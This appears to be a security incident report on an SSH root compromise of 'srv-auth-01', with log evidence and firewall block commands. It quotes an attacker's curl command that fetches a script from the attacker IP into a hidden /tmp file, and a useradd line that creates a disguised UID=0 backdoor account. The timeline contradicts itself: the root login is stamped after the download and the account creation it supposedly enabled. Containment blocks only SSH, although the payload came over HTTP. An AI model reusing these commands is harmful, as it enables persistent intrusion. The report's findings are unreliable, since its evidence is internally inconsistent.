# Incident Report: Unauthorized Access and Privilege Escalation via SSH

## Executive Summary
An unauthorized individual gained root-level access to `srv-auth-01` via brute-force or compromised credentials on November 5, 2026. The attacker successfully escalated privileges, downloaded an external payload via `curl`, and created a hidden backdoor account with root privileges (`UID=0`). Immediate containment and eradication actions are required.

## Evidence
- **Successful Brute-Force / Login:**
  `2026-11-05 01:12:00 srv-auth-01 sshd[7100]: Accepted password for root from 198.51.100.77 port 41031 ssh2`
- **Payload Download:**
  `2026-11-05 01:07:36 srv-auth-01 sudo: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s http://198.51.100.77/x.sh -o /tmp/.x`
- **Backdoor Account Creation:**
  `2026-11-05 01:10:46 srv-auth-01 useradd[7120]: new user: name=svc-backup, UID=0, GID=0, home=/root, shell=/bin/bash`

## Attacker Information
- **Attacker IP Address:** `198.51.100.77`

## Post-Exploitation Activity
1. **Malicious Payload Retrieval:** Downloaded `http://198.51.100.77/x.sh` and saved it to `/tmp/.x`.
2. **Backdoor Creation:** Created a privileged account named `svc-backup` with `UID=0` (root privileges) and root home directory.

## Firewall & Containment Commands
To block the attacker IP immediately:
```bash
ufw deny from 198.51.100.77 to any port 22
iptables -A INPUT -p tcp -s 198.51.100.77 --dport 22 -j DROP
```
